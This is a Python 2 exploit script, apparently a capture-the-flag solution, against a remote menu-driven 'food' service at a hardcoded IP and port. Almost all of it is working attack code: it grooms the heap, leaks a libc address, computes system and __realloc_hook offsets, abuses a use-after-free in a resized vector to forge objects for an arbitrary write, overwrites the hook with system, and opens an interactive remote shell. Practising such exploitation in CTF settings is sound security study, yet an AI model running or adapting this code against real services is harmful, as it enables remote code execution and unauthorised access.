#!/usr/bin/env python2.7

import socket
import struct
import sys
import telnetlib


#ADDR = "localhost"

ADDR = "52.68.53.28"
PORT = 8888
PORT = 0xdada
DEBUG = False

s = socket.create_connection((ADDR, PORT))

def rtil_str(st):
    buf = ""
    x = 0
    while True:
        curr = s.recv(1)
        if curr == "":
            break
        buf += curr
        if(curr == st[x]):
            x += 1
            if x == len(st):
                break
        else:
            x = 0
    if DEBUG:
        sys.stdout.write(buf)
    return buf


def add_food(name, tp):
    s.send("1\n")
    rtil_str("name : ")
    s.send(name + "\n")
    rtil_str("choice : ")
    s.send(str(tp) + "\n")
    return rtil_str("choice : ")

def show_food():
    s.send("2\n")
    return rtil_str("choice : ")

def edit_food(idx, name, tp):
    s.send("3\n")
    rtil_str("edit :\n")
    s.send(str(idx) + "\n")
    rtil_str("name : \n")
    s.send(name + "\n")
    b = rtil_str("\n")
    if "food : " in b:
        s.send(str(tp) + "\n")
    return rtil_str("choice : ")

def delete_food(idx):
    s.send("4\n")
    rtil_str("delete :\n")
    s.send(str(idx) + "\n")
    return rtil_str("choice : ")

def add_type(tpn):
    s.send("5\n")
    rtil_str("food : ")
    s.send(tpn + "\n")
    return rtil_str("choice : ")

def delete_type(idx):
    s.send("6\n")
    rtil_str("remove : \n")
    s.send(str(idx) + "\n")
    return rtil_str("choice : ")

def quit():
    s.send("7\n")
    return rtil_str("~")


# make huge buffer
# matching the size of the
# next vector resize
# we will 'intercept' the vector
# that way we don't need to do
# any fancy stuff on the heap (like overwriting heap metadata)

add_type("poop")
buf = "X" * 1535 + "\x00" * 10
add_food(buf, 5)

# fill vector
for i in range(6 + 16):
    add_food(chr(ord('a') + i) * 8, 1)

# get leak
buf = show_food()
for i in buf.split("\n"):
    if "bbbbbb" in i:
        leak = i.split("bbbbbbbb")[1] 

lc_leak = struct.unpack("<Q", leak.ljust(8, "\x00"))[0]
realloc_hk = lc_leak - 0x88
system = lc_leak - 0x378178
sh_str = lc_leak - 0x3ab7a6

print "[+] leaked libc addr: %s [+]"%hex(lc_leak)
print "[+] __realloc_hook addr: %s [+]"%hex(realloc_hk)
print "[+] system addr: %s [+]"%hex(system)
print "[+] 'sh' string addr: %s [+]"%hex(sh_str)

# free the buffer and then
# add one more food to trigger vector resize (upsize)
edit_food(9, "\x00" * 10, 5)
add_food("z" * 32, 1)

# UAF it up
delete_food(9)                      # this actually might not be necessary
                                    # since the binary will free all the foods
                                    # in the vector to realloc them at *some* point

# massage some more
buf = "V" * 1535 + "\x00" * 10
add_food(buf, 1)


# this guy takes over the vector
# at offset 1080 the we have
# fake food objects
# that we use for arbitrary write

buf = "Z" * 1080
buf += "\x00"
buf += "\x00"
buf += "A" * 6
buf += struct.pack("<Q", realloc_hk)
buf += "JUNKJUNK"
buf += "\x00"
buf += "\x00"
buf = buf + "B" * 6
buf += struct.pack("<Q", sh_str)
buf = buf.ljust(1535, "L")
buf += "\x00" * 10
add_food(buf, 1)

s.send("3\n")
rtil_str("edit :\n")
s.send("0\n")
addr = struct.pack("<Q", system)
s.send(addr + "\n")
rtil_str("food : ")
s.send("11\n")
rtil_str("choice : ")

# call system
# this is done by triggering realloc
# we control the first argument since we
# control the whole food object
s.send("3\n")
rtil_str(":\n")
s.send("1\n")
rtil_str(": \n")
# name needs to be longer than 8 to trigger
# realloc (c.f code)
s.send("aaaaaaaaaaa\n")

print "[+] shell [+]"
t = telnetlib.Telnet()
t.sock = s
t.interact()
